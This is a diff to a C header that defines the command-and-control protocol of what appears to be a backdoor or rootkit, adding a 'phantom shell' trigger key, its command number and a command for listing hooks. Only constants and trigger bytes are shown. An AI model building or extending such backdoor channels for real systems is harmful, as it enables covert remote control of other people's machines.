@@ -3,6 +3,7 @@
 
 //C&C V0 & V1 --> Unencrypted transmission with RAW sockets, no TCP conn
 //Protocol messages are also used inside the secure channel of V2 & V3 backdoor
+#define CC_PROT_BASELINE "CC_"
 #define CC_PROT_SYN "CC_SYN"
 #define CC_PROT_ACK "CC_ACK"
 #define CC_PROT_MSG "CC_MSG#"
@@ -19,11 +20,15 @@
 #define CC_TRIGGER_SYN_PACKET_KEY_3_ENCRYPTED_SHELL "\x1F\x29"
 #define CC_TRIGGER_SYN_PACKET_KEY_3_HOOK_ACTIVATE_ALL "\x1D\x25"
 #define CC_TRIGGER_SYN_PACKET_KEY_3_HOOK_DEACTIVATE_ALL "\x1D\x24"
+#define CC_TRIGGER_SYN_PACKET_KEY_3_PHANTOM_SHELL "\x4E\x14"
 #define CC_TRIGGER_SYN_PACKET_SECTION_LEN 0x02
 
 #define CC_PROT_COMMAND_ENCRYPTED_SHELL 0
 #define CC_PROT_COMMAND_HOOK_ACTIVATE_ALL 1
 #define CC_PROT_COMMAND_HOOK_DEACTIVATE_ALL 2
+#define CC_PROT_COMMAND_PHANTOM_SHELL 3
+
+#define CC_PROT_PHANTOM_COMMAND_LIST_HOOKS 0
 
 //C&C V3 -- Distributed hidden payload in packet stream + encrypted shell
 struct trigger_32_t {
